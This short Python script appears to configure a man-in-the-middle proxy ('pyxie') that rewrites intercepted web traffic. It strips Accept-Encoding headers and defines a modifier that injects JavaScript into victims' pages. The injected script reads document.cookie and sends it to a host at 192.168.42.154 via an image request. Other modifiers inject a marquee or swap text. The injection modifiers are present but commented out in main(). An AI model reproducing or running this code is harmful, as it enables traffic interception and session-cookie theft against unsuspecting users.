#!/usr/bin/env python3

import sys
import re

import pyxie
import modifier
import config


def mod1(data):

    return re.sub(r'Accept-Encoding:.*\r\n', '', data.decode('utf8', 'ignore')).encode('utf8')

def mod2(data):

    javascript = '<script>var lkja=document.createElement("img");lkja.src="http://192.168.42.154/index.php?c="+encodeURIComponent(document.cookie);document.getElementsByTagName("body")[0].appendChild(lkja);</script>'
    m = data.replace('</body>', javascript+"</body>")
    return m

def mod3(data):

    javascript = '<marquee>huehuehuehuehuehuehuehuehuehuehuehuehuehuehue</marquee>'
    print(data.replace('</body>', "%s</body>" % javascript))
    return data.replace('</body>', "%s</body>" % javascript)

def mod4(data):

    return data.replace('foobar', 'barfoo')

def main():

    try:
        config.modifiers.append(modifier.CustomModifier(mod1))
        """
        pyxie.add_modifier(pyxie.CustomModifier(mod2))
        pyxie.add_modifier(pyxie.CustomModifier(mod3))
        pyxie.add_modifier(pyxie.CustomModifier(mod4))
        """
        pyxie.start()
    except KeyboardInterrupt as e:
        print(e)
        pyxie.stop()
        sys.exit(0)

if __name__ == "__main__":
    sys.exit(main())
